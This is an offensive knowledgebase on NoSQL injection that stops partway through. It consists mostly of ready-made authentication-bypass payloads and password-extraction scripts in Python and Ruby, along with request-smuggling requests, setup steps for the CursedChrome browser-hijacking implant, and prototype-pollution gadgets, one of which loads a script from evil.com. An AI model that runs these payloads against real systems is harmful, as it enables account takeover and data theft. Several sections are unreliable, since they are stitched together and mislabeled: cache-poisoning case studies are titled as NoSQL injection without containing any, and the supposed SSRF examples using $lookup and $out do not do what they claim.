# NoSQL Injection (NoSQLi) — Research-Grade Knowledgebase

> **Version:** 1.0 | **Last Updated:** 2026-05-24
> A comprehensive, deduplicated, research-grade knowledgebase for bug bounty hunters and black-box testers covering NoSQL injection theory, payloads, exploitation chains, automation, and advanced attack vectors.

---

## Table of Contents

1. [Basics](#basics)
2. [NoSQL Injection Theory](#nosql-injection-theory)
3. [MongoDB Internals](#mongodb-internals)
4. [Operator Injection Payloads](#operator-injection-payloads)
5. [Authentication Bypass Payloads](#authentication-bypass-payloads)
6. [Regex Abuse Payloads](#regex-abuse-payloads)
7. [Aggregation Pipeline Abuse](#aggregation-pipeline-abuse)
8. [JavaScript Execution Payloads](#javascript-execution-payloads)
9. [BSON Parser Confusion](#bson-parser-confusion)
10. [Blind NoSQL Injection](#blind-nosql-injection)
11. [Time-Based NoSQLi](#time-based-nosqli)
12. [Request Smuggling + NoSQLi Chains](#request-smuggling--nosqli-chains)
13. [Cache Poisoning + NoSQLi Chains](#cache-poisoning--nosqli-chains)
14. [OAuth + NoSQLi Chains](#oauth--nosqli-chains)
15. [SSRF + NoSQLi Chains](#ssrf--nosqli-chains)
16. [Parser Confusion Payloads](#parser-confusion-payloads)
17. [Browser Quirks](#browser-quirks)
18. [Gadget Chains](#gadget-chains)
19. [Real World Case Studies](#real-world-case-studies)
20. [Fuzzing Payloads](#fuzzing-payloads)
21. [Automation Workflows](#automation-workflows)
22. [Recon Methodology](#recon-methodology)
23. [Nuclei Templates](#nuclei-templates)
24. [Tools and Scanners](#tools-and-scanners)
25. [Advanced Research](#advanced-research)
26. [Bug Bounty Writeups](#bug-bounty-writeups)
27. [Payload Collections](#payload-collections)
28. [WAF Bypasses](#waf-bypasses)
29. [Detection Techniques](#detection-techniques)
30. [References](#references)

---

## Basics

### What is NoSQL Injection?

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. Unlike SQL injection which targets relational databases using SQL syntax, NoSQL injection exploits the query languages and data structures of non-relational databases.

### Impact

- **Authentication bypass** — Log in as any user without credentials
- **Data extraction** — Extract sensitive data character by character
- **Data modification** — Edit or delete arbitrary data
- **Denial of Service** — Crash the database or application
- **Remote Code Execution** — Execute JavaScript or system commands via database functions

### NoSQL vs SQL Injection Key Differences

| Aspect | SQL Injection | NoSQL Injection |
|--------|---------------|-------------------|
| Query language | Universal SQL | Database-specific (JSON, JavaScript, etc.) |
| Data structure | Relational tables | Documents, key-value, wide-column, graph |
| Injection context | String concatenation | JSON objects, JavaScript expressions |
| Operators | SQL keywords | Database-specific operators (`$ne`, `$gt`, `$regex`) |
| Schema | Fixed schema | Flexible/semi-structured (schema-less) |

### Common NoSQL Databases

- **MongoDB** — Document store (most targeted for NoSQLi)
- **CouchDB** — Document store
- **Redis** — Key-value store
- **Cassandra** — Wide-column store
- **Neo4j** — Graph database
- **DynamoDB** — AWS managed NoSQL

---

## NoSQL Injection Theory

### Two Types of NoSQL Injection

#### 1. Syntax Injection

Occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to SQL injection but the attack varies significantly because NoSQL databases use different query languages and data structures.

**Example vulnerable code:**
```javascript
// Node.js with MongoDB
const query = { category: req.query.category };
db.products.find(query);
```

**Injection:**
```
GET /product/lookup?category=fizzy'||'1'=='1
```

**Resulting query:**
```javascript
this.category == 'fizzy'||'1'=='1'
```

The injected condition always evaluates to true, returning all items.

#### 2. Operator Injection

Occurs when you can use NoSQL query operators to manipulate queries. NoSQL databases use operators like `$ne`, `$gt`, `$regex`, `$where` to specify conditions.

**Example vulnerable code:**
```javascript
// Node.js with MongoDB
const query = { username: req.body.username, password: req.body.password };
db.users.findOne(query);
```

**Injection:**
```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

**Resulting query:**
```javascript
db.users.findOne({ username: { $ne: "invalid" }, password: { $ne: "invalid" } })
```

This returns the first user where both username and password are not equal to "invalid".

### MongoDB Query Contexts

MongoDB queries can be constructed in multiple ways, each with different injection potential:

1. **JSON query objects** — `db.collection.find({ field: value })`
2. **JavaScript expressions** — `db.collection.find({ $where: "this.field == 'value'" })`
3. **Aggregation pipelines** — `db.collection.aggregate([{ $match: { field: value } }])`
4. **MapReduce** — `db.collection.mapReduce(map, reduce, { query: { field: value } })`

---

## MongoDB Internals

### BSON (Binary JSON)

MongoDB stores data in BSON format. Key characteristics relevant to injection:

- BSON supports more data types than JSON (e.g., Date, Binary, ObjectId, Timestamp)
- BSON documents can contain duplicate keys (last occurrence takes precedence)
- Maximum document size: 16MB
- Field names cannot contain null bytes (`\x00`)

### MongoDB Query Operators

#### Comparison Operators

| Operator | Description |
|----------|-------------|
| `$eq` | Matches values equal to specified value |
| `$gt` | Matches values greater than specified value |
| `$gte` | Matches values greater than or equal to specified value |
| `$in` | Matches any of the values in an array |
| `$lt` | Matches values less than specified value |
| `$lte` | Matches values less than or equal to specified value |
| `$ne` | Matches all values not equal to specified value |
| `$nin` | Matches none of the values in an array |

#### Logical Operators

| Operator | Description |
|----------|-------------|
| `$and` | Joins query clauses with AND |
| `$not` | Inverts the effect of a query expression |
| `$nor` | Joins query clauses with NOR |
| `$or` | Joins query clauses with OR |

#### Element Operators

| Operator | Description |
|----------|-------------|
| `$exists` | Matches documents that have the specified field |
| `$type` | Matches documents where a field is of a specified type |

#### Evaluation Operators

| Operator | Description |
|----------|-------------|
| `$expr` | Allows use of aggregation expressions |
| `$jsonSchema` | Validates documents against JSON schema |
| `$mod` | Performs modulo operation |
| `$regex` | Matches documents where values match a regular expression |
| `$text` | Performs text search |
| `$where` | Matches documents that satisfy a JavaScript expression |

#### Array Operators

| Operator | Description |
|----------|-------------|
| `$all` | Matches arrays containing all elements |
| `$elemMatch` | Matches documents with array elements matching all conditions |
| `$size` | Selects documents if array field is a specified size |

### Aggregation Pipeline Stages

| Stage | Description |
|-------|-------------|
| `$addFields` | Adds new fields to documents |
| `$bucket` | Categorizes documents into buckets |
| `$group` | Groups documents by a specified expression |
| `$lookup` | Performs left outer join |
| `$match` | Filters documents |
| `$project` | Reshapes documents |
| `$redact` | Restricts content based on document |
| `$unwind` | Deconstructs array field |

### Aggregation Expression Operators

| Operator | Description |
|----------|-------------|
| `$add` | Adds numbers |
| `$concat` | Concatenates strings |
| `$cond` | Ternary operator |
| `$ifNull` | Returns first non-null expression |
| `$switch` | Evaluates case expressions |
| `$toLower` / `$toUpper` | Case conversion |
| `$substr` | Returns substring |

---

## Operator Injection Payloads

### Basic Operator Injection

When user input is used directly in a MongoDB query, operators can be injected.

**URL-encoded form data:**
```
username[$ne]=invalid&password[$ne]=invalid
```

**JSON body:**
```json
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

### Common Operator Injection Patterns

```json
// Not equal bypass
{"username": {"$ne": null}, "password": {"$ne": null}}

// Greater than bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Greater than undefined
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}

// In operator for targeting specific accounts
{"username": {"$in": ["admin", "administrator", "superadmin"]}, "password": {"$ne": ""}}

// Regex for partial matching
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
```

### URL Parameter Operator Injection

When the application parses URL parameters into query operators:

```
GET /api/users?username[$ne]=admin&password[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$in][]=admin&role[$in][]=moderator
```

### Nested Operator Injection

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}
{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
```

### Operator Injection via Array Indices

```
username[0]=admin&username[1][$ne]=invalid
```

### Advanced Operator Combinations

```json
// Using $expr for aggregation expressions in queries
{"$expr": {"$eq": ["$username", "admin"]}}

// Combining $and with $or
{"$and": [
    {"$or": [{"username": "admin"}, {"username": "root"}]},
    {"password": {"$ne": ""}}
]}

// Using $not
{"username": {"$not": {"$eq": "invalid"}}}
```

---

## Authentication Bypass Payloads

### Basic Authentication Bypass

**URL-encoded:**
```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

**JSON body:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### Targeted Authentication Bypass

```json
// Target admin specifically
{"username": {"$eq": "admin"}, "password": {"$ne": ""}}

// Target via regex
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// Target first user
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### Session Poisoning via NoSQLi

If the application stores OAuth or session data in MongoDB:

```json
// Poison redirect_uri in session
{"client_id": "trusted", "redirect_uri": "http://attacker.com/steal"}
```

### Authentication Bypass with JavaScript

```javascript
// Using $where
{"$where": "this.username == 'admin' || true"}

// Sleep-based confirmation
{"$where": "sleep(5000) || true"}
```

---

## Regex Abuse Payloads

### Basic Regex Data Extraction

```json
// Check if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a.*"}}

// Check if password contains digits
{"username": "admin", "password": {"$regex": "/\\d/"}}

// Extract length
{"username": "admin", "password": {"$regex": ".{8}"}}
```

### Character-by-Character Extraction

```json
// Check first character
{"username": "admin", "password": {"$regex": "^a"}}

// Check second character
{"username": "admin", "password": {"$regex": "^aa"}}

// Check with character class
{"username": "admin", "password": {"$regex": "^[a-z]"}}
```

### Regex for Field Enumeration

```javascript
// Check if field exists
admin' && this.password!=' 

// Compare with known existing field
admin' && this.username!=' 
admin' && this.foo!=' 
```

If `password` field exists, response matches `username` (existing) but differs from `foo` (non-existing).

### Advanced Regex Patterns

```json
// Case-insensitive matching
{"username": {"$regex": "admin", "$options": "i"}}

// Multi-line matching
{"username": {"$regex": "^admin$", "$options": "m"}}

// Dotall mode
{"username": {"$regex": "admin.*", "$options": "s"}}

// Extended mode (ignores whitespace)
{"username": {"$regex": "a d m i n", "$options": "x"}}
```

### Regex Denial of Service (ReDoS)

```json
// Catastrophic backtracking
{"username": {"$regex": "(a+)+$"}}

// Exponential backtracking with nested quantifiers
{"username": {"$regex": "(a|aa)+$"}}
```

---

## Aggregation Pipeline Abuse

### Basic Aggregation Injection

If user input flows into an aggregation pipeline:

```javascript
// Vulnerable code
db.users.aggregate([
    { $match: { username: req.body.username } },
    { $group: { _id: "$role", count: { $sum: 1 } } }
]);
```

**Injection:**
```json
{"username": {"$ne": null}}
```

### Aggregation Pipeline Stage Injection

```json
// Inject additional stages
[
    {"$match": {"username": "admin"}},
    {"$lookup": {
        "from": "passwords",
        "localField": "_id",
        "foreignField": "user_id",
        "as": "passwords"
    }},
    {"$project": {"passwords": 1}}
]
```

### $expr Injection

```json
// Using $expr in find queries
{"$expr": {"$eq": ["$username", "admin"]}}

// Using $expr with $function (MongoDB 4.4+)
{"$expr": {"$function": {
    "body": "function() { return true; }",
    "args": [],
    "lang": "js"
}}}
```

### Aggregation for Data Exfiltration

```json
[
    {"$match": {"username": "admin"}},
    {"$project": {
        "password": 1,
        "email": 1,
        "secret": 1
    }}
]
```

---

## JavaScript Execution Payloads

### $where Operator

The `$where` operator allows JavaScript execution in queries.

```javascript
// Basic true condition
{"$where": "1"}

// Always true
{"$where": "true"}

// Function returning true
{"$where": "function() { return true; }"}
```

### Data Extraction via JavaScript

```javascript
// Extract password character by character
admin' && this.password[0] == 'a' || 'a'=='b

// Check password length
admin' && this.password.length < 30 || 'a'=='b

// Check with match()
admin' && this.password.match(/\d/) || 'a'=='b

// Check field existence
admin' && this.password!=' 
```

### Field Name Enumeration

```javascript
// Enumerate field names character by character
{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}
```

This inspects the first data field and returns the first character of the field name.

### JavaScript Function Injection

```javascript
// Sleep function for time-based detection
{"$where": "sleep(5000)"}

// Date-based delay
{"$where": "var waitTill = new Date(new Date().getTime() + 5000); while(waitTill > new Date()){}"}

// Conditional delay
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

### mapReduce Injection

```javascript
// Vulnerable mapReduce
db.collection.mapReduce(
    function() { emit(this.username, this.password); },
    function(key, values) { return Array.sum(values); },
    { query: { username: userInput } }
);
```

**Injection:**
```javascript
// Inject JavaScript into map function
{"username": {"$ne": null}, "$where": "1"}
```

### $function Operator (MongoDB 4.4+)

```json
{"$expr": {"$function": {
    "body": "function(username) { return true; }",
    "args": ["$username"],
    "lang": "js"
}}}
```

---

## BSON Parser Confusion

### Duplicate Key Precedence

In MongoDB, if a document contains duplicate keys, only the **last occurrence** takes precedence:

```json
{"id": "10", "id": "100"}
```

Final value of `id` will be `"100"`.

**Exploitation:**
```json
// Bypass WAF by using duplicate keys
{"username": "admin", "username": {"$ne": "invalid"}}
```

### Null Byte Truncation

MongoDB ignores all characters after a null byte (`\x00` or `\u0000`) in some contexts:

```
GET /product/lookup?category=fizzy%00
```

**Resulting query:**
```javascript
this.category == 'fizzy\u0000' && this.released == 1
```

MongoDB ignores everything after the null byte, removing the `released` restriction.

### Type Confusion

```json
// Pass integer where string expected
{"username": 0}

// Pass array where string expected
{"username": ["admin"]}

// Pass object where string expected
{"username": {"$ne": null}}
```

### BSON Type Manipulation

```json
// ObjectId injection
{"_id": {"$oid": "507f1f77bcf86cd799439011"}}

// Date injection
{"createdAt": {"$date": "2024-01-01T00:00:00Z"}}

// Binary injection
{"data": {"$binary": "base64data", "$type": "00"}}
```

---

## Blind NoSQL Injection

### Boolean-Based Blind NoSQLi

When the application doesn't return data directly but shows different behavior for true/false conditions.

**Detection:**
```
// False condition - no products
GET /product/lookup?category=Gifts'+%26%26+0+%26%26+'x

// True condition - products retrieved
GET /product/lookup?category=Gifts'+%26%26+1+%26%26+'x
```

**Character extraction:**
```
// Check if password[0] == 'a'
GET /user/lookup?username=admin'+%26%26+this.password[0]==='a'+%7c%7c+'a'=='b
```

### Blind NoSQLi with $regex

```json
// Check if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a"}}

// Extract character by character
{"username": "admin", "password": {"$regex": "^aa"}}
```

### Blind NoSQLi Scripts

**Python — JSON Body:**
```python
import requests
import string
import urllib3
urllib3.disable_warnings()

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char: %s" % (password + c))
                password += c
                break
```

**Python — URL-encoded Body:**
```python
import requests
import string
import urllib3
urllib3.disable_warnings()

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '&', '$']:
            payload = 'user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if r.status_code == 302 and r.headers.get('Location') == '/dashboard':
                print("Found one more char: %s" % (password + c))
                password += c
                break
```

**Python — GET Request:**
```python
import requests
import string

username = 'admin'
password = ''
url = 'http://example.org/login'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = f"?username={username}&password[$regex]=^{password + c}"
            r = requests.get(url + payload)
            if 'Yeah' in r.text:
                print(f"Found one more char: {password + c}")
                password += c
                break
```

**Ruby — GET Request:**
```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
CHARSET = [*'0'..'9', *'a'..'z', '-']
GET_EXCLUDE = ['*', '+', '.', '?', '|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
    CHARSET.each do |c|
        unless GET_EXCLUDE.include?(c)
            payload = "?username=#{username}&password[$regex]=^#{password + c}"
            res = session.get(url + payload)
            if res.body.to_s.match?('Yeah')
                puts "Found one more char: #{password + c}"
                password += c
            end
        end
    end
end
```

---

## Time-Based NoSQLi

### Time-Based Detection

When triggering errors doesn't cause a difference in response, use JavaScript injection to trigger conditional time delays.

**Methodology:**
1. Load the page several times to determine baseline loading time
2. Insert a timing payload
3. Identify if the response loads more slowly

### Time-Based Payloads

```javascript
// Basic sleep
{"$where": "sleep(5000)"}

// Conditional sleep - password starts with 'a'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

// Date-based busy wait
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

// Using while loop
{"$where": "var d = new Date(); var d2 = null; do { d2 = new Date(); } while (d2 - d < 5000);"}
```

### Time-Based Character Extraction

```javascript
// Check each character position with time delay
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
admin'+function(x){if(x.password[0]==="b"){sleep(5000)};}(this)+'
// ... continue for each character
```


---

## Request Smuggling + NoSQLi Chains

### HTTP Desync Attack Classes

| Class | Description |
|-------|-------------|
| CL.TE | Front-end uses Content-Length, back-end uses Transfer-Encoding |
| TE.CL | Front-end uses Transfer-Encoding, back-end uses Content-Length |
| H2.CL | HTTP/2 front-end, HTTP/1.1 back-end with Content-Length confusion |
| H2.TE | HTTP/2 front-end, HTTP/1.1 back-end with Transfer-Encoding confusion |
| CL.0 | Back-end ignores Content-Length entirely |
| H2.0 | HTTP/2 to HTTP/1.1 with back-end ignoring body |

### Request Smuggling for NoSQLi

Request smuggling can be used to smuggle NoSQL injection payloads past front-end security controls:

```
POST / HTTP/1.1
Host: example.com
Content-Length: 53
Transfer-Encoding: chunked

17
=x&q=smuggling&x=
0

POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 100

{"username": {"$ne": null}, "password": {"$ne": null}}
```

The smuggled NoSQLi payload bypasses front-end WAF rules that might block direct requests.

### Client-Side Desync (CSD) + NoSQLi

Browser-powered desync attacks can poison connection pools to inject NoSQLi payloads:

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

### TE.CL Desync for NoSQLi

```
POST /search HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

96
GET /api/users HTTP/1.1
X: x=1&q=smuggling&x=
Host: example.com
Content-Type: application/json
Content-Length: 100

x=
0

POST /search HTTP/1.1
Host: example.com
```

### CL.TE Desync for NoSQLi

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```

Front-end forwards blue text only; back-end times out waiting for next chunk size.

### Smuggler Tool Usage

```bash
# Single host
python3 smuggler.py -u https://target.com/api/login

# List of hosts
cat hosts.txt | python3 smuggler.py

# Custom method
python3 smuggler.py -u https://target.com/api/login -m POST

# Custom config
python3 smuggler.py -u https://target.com/api/login -c custom.py
```

### HTTP Request Smuggler (Burp Extension)

1. Right-click request → "Launch Smuggle probe"
2. Wait for completion
3. If vulnerable, right-click → "Smuggle attack (CL.TE)"
4. Edit `prefix` variable to inject NoSQLi payload

---

## Cache Poisoning + NoSQLi Chains

### Web Cache Poisoning Basics

Caches save copies of responses. The cache key typically includes: method, path, query string, Host header. Unkeyed components (headers not in cache key) can be poisoned.

### Cache Poisoning for NoSQLi Amplification

1. Find an unkeyed input that affects NoSQL query construction
2. Poison the cache with a NoSQLi payload
3. All subsequent users receive the poisoned response

**Example:**
```
GET /api/users?username=admin HTTP/1.1
Host: target.com
X-Custom-Header: {"$ne": null}
```

If `X-Custom-Header` is unkeyed and used in the NoSQL query, poisoning it affects all cache hits.

### Cache Parameter Cloaking

Exploit URL parsing quirks to hide NoSQLi parameters from the cache key:

```
// Akamai akamai-transform parameter cloaking
GET /api/login?username=admin?akamai-transform={"$ne":null} HTTP/1.1

// Ruby on Rails semicolon delimiter
GET /api/login?username=admin;password={"$ne":null} HTTP/1.1
```

### Fat GET for NoSQLi

Some caches forward GET body without including it in the cache key:

```
GET /api/users HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username={"$ne":null}&password={"$ne":null}
```

### Internal Cache Poisoning

Application-level caches (e.g., WP Rocket) cache fragments without proper keys:

```
GET /api/users?username=admin HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

May poison every page on the site if the cache reflects the header in all responses.

---

## OAuth + NoSQLi Chains

### Dynamic Client Registration SSRF + NoSQLi

OAuth dynamic client registration endpoints accept URLs that may be fetched server-side:

```json
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
    "application_type": "web",
    "redirect_uris": ["https://client.example.org/callback"],
    "logo_uri": "https://attacker.com/logo.png",
    "jwks_uri": "https://attacker.com/keys.jwks",
    "sector_identifier_uri": "https://attacker.com/uris.json"
}
```

**Chain with NoSQLi:**
- Register client with `logo_uri` pointing to internal NoSQL endpoint
- Server fetches the URL, potentially triggering NoSQLi in internal APIs

### redirect_uri Session Poisoning

If the OAuth server stores parameters in session:

1. User visits attacker page
2. Page redirects to OAuth with trusted `client_id`
3. Background request poisons session with malicious `redirect_uri`
4. User approves → token leaked to attacker

**NoSQLi in session storage:**
If session data is stored in MongoDB, NoSQLi in the session storage can modify the `redirect_uri`:

```json
{"session_id": "abc123", "redirect_uri": {"$ne": null}}
```

### WebFinger User Enumeration + NoSQLi

```
GET /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1
```

If the WebFinger endpoint queries a NoSQL database:

```json
{"resource": {"$regex": ".*"}, "rel": "http://openid.net/specs/connect/1.0/issuer"}
```

---

## SSRF + NoSQLi Chains

### NoSQLi to SSRF via $where

```javascript
{"$where": "function() { var x = new XMLHttpRequest(); x.open('GET','http://internal:8080/'); x.send(); return true; }"}
```

### Aggregation Pipeline $lookup SSRF

```json
[
    {"$match": {"username": "admin"}},
    {"$lookup": {
        "from": "external_collection",
        "pipeline": [
            {"$match": {"$expr": {"$eq": ["$user_id", "$$user_id"]}}}
        ],
        "as": "external_data"
    }}
]
```

### MongoDB $out to External System

```json
[
    {"$match": {"username": "admin"}},
    {"$out": "external_db.external_collection"}
]
```

### NoSQLi via logo_uri in OAuth

```json
{
    "redirect_uris": ["https://client.example.org/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/"
}
```

---

## Parser Confusion Payloads

### JSON.parse() vs JavaScript Object Literal

`JSON.parse()` is stricter than JavaScript object literals:

```javascript
// Valid in JS but NOT in JSON
{foo: 'bar'}        // Unquoted keys
{'foo': 'bar'}      // Single quotes
{foo: "bar",}       // Trailing comma
{foo: undefined}     // undefined value
{foo: NaN}          // NaN
{foo: Infinity}     // Infinity
{foo: new Date()}   // Constructor calls
```

**Exploitation:** If the application uses `eval()` instead of `JSON.parse()`:

```json
{"username": "admin", "password": {"$ne": null}}
```

May be parsed differently if the parser is confused.

### Content-Type Confusion

```
Content-Type: application/json
// But body is URL-encoded

Content-Type: application/x-www-form-urlencoded
// But body is JSON
```

Some frameworks parse based on Content-Type, others on body structure.

### Parameter Pollution

```
GET /api/login?username=admin&username={"$ne":null}
```

Frameworks handle duplicate parameters differently:
- PHP: `$_GET['username']` = last value
- Node.js (Express): `req.query.username` = array of both values
- Java: First value
- Python (Flask): Last value

### Array Parameter Confusion

```
GET /api/login?username[]=admin&username[]={"$ne":null}
```

Some frameworks convert `username[]` to an array, which may bypass type checks.

---

## Browser Quirks

### Fetch API Behavior

```javascript
// fetch() sends Content-Length automatically
fetch('https://example.com/api', {
    method: 'POST',
    body: JSON.stringify({"username": {"$ne": null}}),
    headers: {'Content-Type': 'application/json'}
});
```

### CORS and NoSQLi

Cross-origin requests with custom Content-Type trigger preflight:

```javascript
// Simple request (no preflight)
fetch('https://target.com/api', {
    method: 'POST',
    body: 'username={"$ne":null}'
});

// Preflight required (custom header)
fetch('https://target.com/api', {
    method: 'POST',
    body: JSON.stringify({"username": {"$ne": null}}),
    headers: {'Content-Type': 'application/json', 'X-Custom': 'value'}
});
```

### postMessage Tracker

Chrome extension to track `postMessage` usage:
- Logs `postMessage` listeners (URL, domain, stack)
- Tracks short-lived and interaction-triggered listeners
- Logs listener functions to remote endpoint
- Supports Raven, New Relic, Rollbar, Bugsnag, jQuery wrappers

**Installation:**
1. Clone `fransr/postMessage-tracker`
2. Load unpacked extension in Chrome
3. Set Log URL in extension options
4. Browse target site and review logged listeners

### CursedChrome for Session Hijacking

Chrome extension implant that turns victim browsers into HTTP proxies:
- Browse as victim with their cookies, client certificates
- Useful for locked-down orgs with BeyondCorp/zero-trust
- All requests have correct source IP, cookies, certificates

**Architecture:**
- `127.0.0.1:8080` — HTTP proxy server
- `127.0.0.1:4343` — WebSocket server for victim communication
- `127.0.0.1:8118` — Admin web panel

**Setup:**
```bash
cd cursedchrome/
docker-compose up -d redis db
docker-compose up cursedchrome
```

---

## Gadget Chains

### Client-Side Prototype Pollution + NoSQLi

Prototype pollution can modify NoSQL query objects before they reach the database:

```javascript
// Pollute Object.prototype
?__proto__[username]=$ne

// Result: All objects now have username=$ne
// NoSQL query becomes: { username: { $ne: null } }
```

### Common Gadgets

| Library | Payload | Effect |
|---------|---------|--------|
| jQuery `$.get` | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script` | XSS via script injection |
| jQuery `$.getScript` | `?__proto__[src][]=data:,alert(1)//` | XSS |
| Vue.js | `?__proto__[v-if]=_c.constructor('alert(1)')()` | XSS |
| Lodash | `?__proto__[sourceURL]=\u2028\u2029alert(1)` | XSS |
| sanitize-html | `?__proto__[*][]=onload` | Bypass |
| js-xss | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src` | Bypass |
| DOMPurify | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` | Bypass |
| Google Analytics | `?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://evil.com/gtm.js` | XSS |
| Google Tag Manager | `?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>` | XSS |

### PP-Finder for Gadget Discovery

```bash
# Install
npm install -g pp-finder

# Run on target application
pp-finder run node ./app.js

# Or with lazy start
node --loader pp-finder ./app.js
```

**Output:**
```
[PP][prop] "prepareStackTrace" at node_modules/depd/index.js:384:20
[PP][prop] "noDeprecation" at node_modules/depd/index.js:154:15
[PP][forIn] "_" at node_modules/debug/src/debug.js:47:13
[PP][elem] "filename" at node_modules/ejs/lib/utils.js:167:23
```

---

## Real World Case Studies

### Red Hat — Basic Cache Poisoning with NoSQLi

**Vulnerability:** `X-Forwarded-Host` header used to generate Open Graph URLs, cached by Akamai CDN.

```
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Cache-Control: public, no-cache
<meta property="og:image" content="https://canary/cms/social.png" />
```

**Exploitation:**
```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

### Unity3D — Discreet Poisoning

**Vulnerability:** `X-Host` header used for script imports, Varnish cache with predictable expiry.

```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

**Technique:** Use `Age` and `max-age` headers to predict exact cache expiry and time payload delivery.

### data.gov — DOM Poisoning

**Vulnerability:** `X-Forwarded-Host` controls `data-site-root` attribute, which JavaScript uses to load i18n data.

```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

<body data-site-root="https://canary/">
```

**Chain:**
1. Poison cache with `X-Forwarded-Host: attacker.com`
2. JavaScript fetches `https://attacker.com/api/i18n/en`
3. Attacker serves: `{"Show more":"<svg onload=alert(1)>"}`
4. All users viewing "Show more" get XSS

### Mozilla SHIELD Hijacking

**Vulnerability:** `X-Forwarded-Host` header redirected Firefox SHIELD recipe fetches.

```
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net

{
    "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
    "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/"
}
```

**Impact:** Could redirect tens of millions of Firefox users to attacker-controlled recipes.

### HubSpot Route Poisoning

**Vulnerability:** `X-Forwarded-Server` header overrides internal request routing.

```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary

HTTP/1.1 404 Not Found
<p>The domain canary does not exist in our system.</p>
```

**Exploitation:**
1. Register own HubSpot account
2. Place payload on HubSpot page
3. Poison cache: `X-Forwarded-Host: attacker.hs-sites.com`
4. Cloudflare serves attacker content on victim domain

### Cloudflare Blog — Hidden Route Poisoning

**Vulnerability:** Ghost platform uses `X-Forwarded-Host` for subdomain redirects.

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io

HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

**Chain:**
1. Register ghost.io account with custom domain
2. Set up attacker-controlled redirect destination
3. Poison cache to redirect blog.cloudflare.com resources
4. Hijack images, potentially scripts (with browser quirks)

### X-Original-URL / X-Rewrite-URL

**Vulnerability:** PHP frameworks (Symfony, Zend, Drupal) support these headers for path override.

```
GET /anything HTTP/1.1
Host: unity.com
